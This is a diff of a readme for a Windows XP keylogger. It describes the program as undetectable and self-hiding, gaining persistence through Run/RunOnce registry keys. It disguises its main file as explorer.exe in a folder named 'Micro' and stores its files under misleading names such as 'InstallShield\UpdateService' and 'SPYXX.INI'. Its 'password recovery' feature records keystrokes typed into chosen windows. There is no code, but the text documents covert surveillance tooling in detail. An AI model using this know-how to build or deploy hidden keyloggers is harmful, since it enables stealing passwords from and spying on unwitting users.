@@ -1,23 +1,50 @@
-NO NEED TO INSTALL MANUALLY
-	(move it at its permanent location(as you wish) and run it. Rest will be done by package.)
- 
-new Keylogger3 
+Help can be Found at http://nilskeylogger.blogspot.com
 
-Undetectable, Me.hide and RunOnce / Run key Update.
+
+TRIAL WITH REGISTRATION
+NO NEED TO INSTALL MANUALLY
+Just Run KLG_mangaer.exe and Choose task.
+ 
+Main Keylogger features:
+Auto limit the log if too many keypress.
+Undetectable.Me.hide.
+RunOnce / Run key Update(Optional)
 All Keynames.
-Password to each LOG file so that Only person who installed KLG can access logs with his pwd.
-encryption for log and log password.
-Based on Module Codes, not any OCX control.( INDEPENDANT ). No supporting files req.
+Password to each LOG file(optional).
+encryption for log and log password.(user Defined)
+Based on Module Codes, not any OCX control. No supporting files req.
 opt to choose LOG directory.
-Setting.ini support
-AUTO CREATES SETTING.INI
-Automatic install on run.
-option to choose Run or RunOnce update.
+INI file support
+AUTO CREATES default SETTING.
 every user on XP can use independant setting . even guest can use this program.
 
+LogReader:
+Attractive Look: Left Task pane, Log Details, Calendar Access.
+Notify to register KeyLogger if unregistered.
+3 methods to Browse Logs based on Active LogMode. and 1 direct method to open log.
+Load All Logs. or You can access all logs generated on particular day.
+Password Recovery Feature. which records Keypress under certain titles(user defined) max. 5.
+Dont Show [enter], [clicks], preapplied. and find substring feature.
+save password feature to prevent repeatedly Password prompt.
+Auto register req. OCX>> MSCOMCT2.OCX and COMDLG32.OCX
+Special dialog for setting. (password protected)
 
-Setting.ini Help:
-setting.ini automatically stored in "%SystemDrive% \Documents and Settings\" & username & "\UserData
+Limitations
+Guest cant run logReader before Administrator on few PC.
+SystemDrive assumed to C:
+Change in setting is not directly activated.
+120KB =explorer.exe uses 4500-5000 K Memory.
+NP Antivirus renames it to explorer.VXE and removes Run/RunOnce key.
+
+
+Fixed Paths for related files:
+C: \Documents and Settings\All Users\Application Data\Micro				Contains Main Keylogger - explorer.exe
+C: \Documents and Settings\All Users\Application Data\InstallShield\UpdateService		Contain two files. 1 - Licence Key. 2. Remaining Trials.
+C: \Documents and Settings\" & username & "\Application Data\System			Contain two files  1 - SPYXX.INI, 2. default.MCP
+these paths are selected because guest have access to these paths.
+
+SPYXX.ini Help:
+SPYXX.INI automatically stored in "C: \Documents and Settings\" & username & "\Application Data\System"
 
 [LogSetting]
 USEBS=1    	whether [BS] should print or remove last char.? when Backspace is pressed.
@@ -28,8 +55,5 @@ TimerInt=65	Interval for keypress recognising Loop.
 LogMode=1	0: New Logfile on each startup.	  1:New Logfile everyday.  2:Only One Logfile.
 LogDir=d:\nilesh	Path to store logfiles. (Do not mean if LogSysDir=1)
 SETRUNONCE = 1	Whether Autorun key stored in RunOnce or Run in registry.
-sLogging = 0	Only records log under certain titles defined by User. (titles are stored in %SystemDrive%/Program Files/Common Files/System/titles.dat)
+sLogging = 0	Only records log under certain titles defined by User. (titles are stored in C: \Documents and Settings\" & username & "\Application Data\System\default.MCP)
 Pwd = 		Password for Log.
-
-explorer.exe HELP:
-Keep this file in target location (permanent), and run it from that location itself. So it would autorun on startup from that location only.
